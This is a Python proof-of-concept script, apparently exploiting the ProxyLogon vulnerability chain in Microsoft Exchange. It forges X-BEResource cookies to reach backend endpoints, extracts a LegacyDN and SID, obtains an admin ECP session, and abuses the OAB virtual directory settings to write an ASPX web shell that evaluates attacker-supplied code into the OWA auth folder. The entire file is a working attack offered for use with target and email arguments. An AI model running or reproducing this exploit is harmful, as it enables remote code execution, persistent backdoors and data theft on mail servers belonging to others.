import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys

# Function to generate a random string
def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

# Check if command line arguments are provided
if len(sys.argv) < 3:
    print("Usage: python PoC.py <target> <email>")
    print("Example: python PoC.py mail.evil.corp haxor@evil.corp")
    exit()

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Extract target and email from command line arguments
target = sys.argv[1]
email = sys.argv[2]

# Generate a random name for the script
random_name = id_generator(3) + ".js"

# User-Agent header for the HTTP requests
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

# Path for the malicious shell script
shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ahihi.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

# Content of the malicious shell script
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'

# Hex-encoded byte sequence
legacyDnPatchByte = "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a0a"

# Autodiscover XML body with email address
autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email

# Print information about the target
print("Attacking target " + target)
print("=============================")
print(legacyDnPatchByte.decode('hex'))

# Default FQDN value
FQDN = "EXCHANGE"

# Send GET request to obtain information from the target
ct = requests.get("https://%s/ecp/%s" % (target, random_name),
                 headers={"Cookie": "X-BEResource=localhost~1942062522", "User-Agent": user_agent}, verify=False)

# Check if calculated BE target and FE server headers are present
if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]

# Send POST request with Autodiscover XML body
ct = requests.post("https://%s/ecp/%s" % (target, random_name),
                  headers={"Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
                           "Content-Type": "text/xml", "User-Agent": user_agent},
                  data=autoDiscoverBody, verify=False)

# Check if Autodiscover request was successful
if ct.status_code != 200:
    print("Autodiscover Error!")
    exit()

# Check if LegacyDN is present in the response
if "<LegacyDN>" not in ct.content:
    print("Can not get LegacyDN!")
    exit()

# Extract LegacyDN from the response
legacyDn = ct.content.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
print("Got DN: " + legacyDn)

# Prepare MAPI body for the next request
mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

# Send POST request with MAPI body
ct = requests.post("https://%s/ecp/%s" % (target, random_name),
                   headers={"Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
                            "Content-Type": "application/mapi-http", "User-Agent": user_agent},
                   data=mapi_body, verify=False)

# Check if MAPI request was successful and if the user has ownership of a UserMailbox
if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.content:
    print("Mapi Error!")
    exit()

# Extract SID from the response
sid = ct.content.split("with SID ")[1].split(" and MasterAccountSid")[0]
print("Got SID: " + sid)

# Prepare ProxyLogon request XML body
proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
""" % sid

# Send POST request with ProxyLogon XML body
ct = requests.post("https://%s/ecp/%s" % (target, random_name),
                   headers={"Cookie": "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
                            "Content-Type": "text/xml", "User-Agent": user_agent},
                   data=proxyLogon_request, verify=False)

# Check if ProxyLogon request was successful and if Set-Cookie header is present
if ct.status_code != 241 or not "set-cookie" in ct.headers:
    print("Proxylogon Error!")
    exit()

# Extract session ID and msExchEcpCanary from the response headers
sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
print("Got session id: " + sess_id)
print("Got canary: " + msExchEcpCanary)

# Send GET request to a specific URL to check the canary
ct = requests.get("https://%s/ecp/%s" % (target, random_name),
                  headers={"Cookie": "X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (FQDN, sess_id, msExchEcpCanary),
                           "User-Agent": user_agent}, verify=False)

# Check if the canary is valid
if ct.status_code != 200:
    print("Wrong canary!")
    print("Sometimes we can skip this ...")

# Extract RBAC roles information from the response
rbacRole = ct.content.split("RBAC roles:</span> <span class='diagTxt'>")[1].split("</span>")[0]
print("=========== everything is good let it continue ====")

# Send POST request to get information about OABVirtualDirectory
ct = requests.post("https://%s/ecp/%s" % (target, random_name),
                   headers={"Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                            "Content-Type": "application/json; charset=utf-8", "User-Agent": user_agent},
                   json={"filter": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                  "SelectedView": "", "SelectedVDirType": "All"}},
                         "sort": {}}, verify=False)

# Check if the request to get OABVirtualDirectory information was successful
if ct.status_code != 200:
    print("GetOAB Error!")
    exit()

# Extract OAB id from the response
oabId = ct.content.split('"RawIdentity":"')[1].split('"')[0]
print("Got OAB id: " + oabId)

# Prepare JSON body for setting external URL for OABVirtualDirectory
oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                          "ExternalUrl": "http://ffff/#%s" % shell_content}}}

# Send POST request to set external URL for OABVirtualDirectory
ct = requests.post("https://%s/ecp/%s" % (target, random_name),
                   headers={"Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                            "Content-Type": "application/json; charset=utf-8", "User-Agent": user_agent},
                   json=oab_json, verify=False)

# Check if setting external URL for OABVirtualDirectory was successful
if ct.status_code != 200:
    print("Set external url Error!")
    exit()

# Prepare JSON body for resetting OABVirtualDirectory with shell content
reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                  "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                "FilePathName": shell_absolute_path}}}

# Send POST request to reset OABVirtualDirectory with shell content
ct = requests.post("https://%s/ecp/%s" % (target, random_name),
                   headers={"Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                            "Content-Type": "application/json; charset=utf-8", "User-Agent": user_agent},
                   json=reset_oab_body, verify=False)

# Check if resetting OABVirtualDirectory with shell content was successful
if ct.status_code != 200:
    print("Shell Error!")
    exit()

# Print success message
print("Done!")
